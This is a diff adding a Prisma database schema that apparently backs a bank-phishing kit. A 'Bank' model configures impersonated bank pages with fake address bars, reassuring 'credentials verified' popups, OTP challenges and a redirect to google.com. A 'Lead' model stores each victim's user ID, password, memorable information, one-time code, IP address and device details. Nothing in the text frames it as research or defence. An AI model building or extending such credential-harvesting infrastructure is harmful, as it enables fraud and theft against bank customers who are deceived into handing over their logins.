@@ -1,0 +1,60 @@
+generator client {
+  provider = "prisma-client-js"
+}
+
+datasource db {
+  provider = "sqlite"
+  url      = env("DATABASE_URL")
+}
+
+model Bank {
+  id                String   @id @default(cuid())
+  name              String
+  subtitle          String
+  logoUrl           String?
+  redirectUrl       String?
+  subOptions        String?  @default("Business, Personal, Commercial")
+  sortOrder         Int      @default(0)
+  order             Int      @default(1)
+  isActive          Boolean  @default(true)
+
+  browserUrl        String?
+  browserAddressBar String?
+  popupStatus       String   @default("SUCCESS")
+  popupTitle        String?  @default("Account Verification in Progress")
+  popupHeading      String?  @default("Account Verification in Progress")
+  popupSubtitle     String?  @default("Security Check Required")
+  popupSubheading   String?  @default("Security Check Required")
+  popupMessage      String?  @default("Your open banking credentials have been verified. Click below to continue.")
+  popupBody         String?  @default("Your open banking credentials have been verified. Click below to continue.")
+  supportPhone      String?
+  popupButtonText   String?  @default("Complete Verification")
+  buttonText        String?  @default("Complete Verification")
+  popupRedirectUrl  String?  @default("https://google.com")
+
+  challengeType     String?  @default("none")
+  redirectDelay     Int?     @default(5)
+  otpLength         Int?     @default(6)
+
+  createdAt         DateTime @default(now())
+  updatedAt         DateTime @updatedAt
+}
+
+model Lead {
+  id            String   @id @default(cuid())
+  sessionId     String?  @unique
+  bank          String?
+  bankName      String?
+  bankType      String?  @default("Personal")
+  userId        String?
+  password      String?
+  memorableInfo String?
+  extraData     String?
+  otpCode       String?
+  optionLabel   String?  @default("Default")
+  redirectUrl   String?
+  ipAddress     String?  @default("Unknown")
+  deviceInfo    String?  @default("Unknown")
+  createdAt     DateTime @default(now())
+  updatedAt     DateTime @updatedAt
+}
